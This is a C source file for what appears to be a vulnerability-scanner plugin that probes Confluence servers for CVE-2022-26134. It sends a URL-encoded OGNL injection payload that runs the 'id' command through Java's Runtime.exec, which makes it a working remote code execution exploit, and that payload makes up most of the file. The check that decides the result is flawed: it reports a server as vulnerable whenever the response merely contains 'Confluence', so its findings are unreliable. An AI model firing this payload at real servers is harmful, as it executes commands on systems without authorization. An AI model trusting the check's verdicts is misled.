/* http-vuln-cve2022-26134-4 - Confluence OGNL injection probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29%29%29%7D/", NULL, NULL, NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2022-26134-4: no HTTP response");
        return 0;
    }
    if (ar_contains_ci(resp, "Confluence")) {
        ar_out(ctx, "VULNERABLE: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29%29%29%7D/ [%d] (CVE-2022-26134)", ar_http_status(resp));
    } else {
        ar_out(ctx, "not vulnerable: CVE-2022-26134 (/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29%29%29%7D/ [%d])", ar_http_status(resp));
    }
    return 0;
}
